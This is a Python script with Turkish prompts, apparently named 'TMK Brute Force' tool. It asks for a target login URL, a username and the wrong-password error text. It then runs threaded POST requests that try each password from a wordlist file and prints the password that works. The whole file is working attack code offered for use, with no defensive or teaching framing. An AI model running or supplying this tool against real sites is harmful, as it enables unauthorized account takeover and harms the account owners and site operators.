import threading
import requests
import time
import sys
from termcolor import colored
from colorama import Fore, Back, Style
import os

class BruteForceCracker:
    def __init__(self, url, username, error_message):
        self.url = url
        self.username = username
        self.error_message = error_message

    def crack(self, password):
        data_dict = {"LogInID": self.username, "Password": password, "Log In": "submit"}
        response = requests.post(self.url, data=data_dict)
        
        if self.error_message in str(response.content):
            return False
        elif "CSRF" in str(response.content) or "csrf" in str(response.content):
            print("CSRF İkazı Alındı!! Brute Force Bu Website Üzerinde Çalışmıyor.")
            sys.exit()
        else:
            print("Kullanıcı Adı: ---> " + self.username)
            print(colored("Parola: ---> " + password, "red"))  # Parola kırmızı renkte yazdırılır
            return True

def crack_passwords(passwords, cracker):
    count = 0
    for password in passwords:
        count += 1
        password = password.strip()
        print(colored("Denenen Parola: {} Kez => {}".format(count, password), "blue"))  # Denenen parola mavi renkte yazdırılır
        if cracker.crack(password):
            return

def yaz():
    yazi = (
        '''\033[1;31mTMK BRUTE FORCE ARACINA HOŞ GELDİNİZ\033[0m''')
    print(yazi)

def main():
    yaz()
    os.system("clear")
    print("\n")
    url = input("Hedef URL'yi Girin: ")
    username = input("Hedef Kullanıcı Adını Girin: ")
    error = input("Yanlış Parola Hata Mesajını Girin: ")
    cracker = BruteForceCracker(url, username, error)
    
    with open("sifreler.txt", "r") as f:
        chunk_size = 1000
        while True:
            passwords = f.readlines(chunk_size)
            if not passwords:
                break
            t = threading.Thread(target=crack_passwords, args=(passwords, cracker))
            t.start()

if __name__ == '__main__':
    banner = """ 
                       Sunucuyu Kontrol Ediliyor !!        
        [+]█████████████████████████████████████████████████[+]
"""
    print(banner)
    main()
